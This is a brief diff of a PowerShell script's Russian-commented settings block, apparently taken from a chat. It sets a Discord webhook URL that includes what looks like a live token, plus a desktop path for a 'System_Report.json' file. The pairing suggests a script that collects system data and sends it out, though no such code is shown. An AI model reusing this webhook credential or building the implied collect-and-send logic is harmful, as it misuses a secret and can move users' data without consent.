@@ -1,4 +1,3 @@
-𝕯𝖆𝖓𝖞𝖑𝖔, [05/06/2025 19:18]
 # ========== НАСТРОЙКИ ==========
 $webhookUrl = "https://discord.com/api/v10/webhooks/1380240005724770304/ZXWZ-qvvwloOPEwnZqw9wHNi1uuDVK_kmdNGzokReEyjqsHo8m6oDbbjrO2-XBlEctYP"  # 🔴 ОБЯЗАТЕЛЬНО ЗАМЕНИ НА СВОЙ!
 $reportPath = "$env:USERPROFILE\Desktop\System_Report.json"
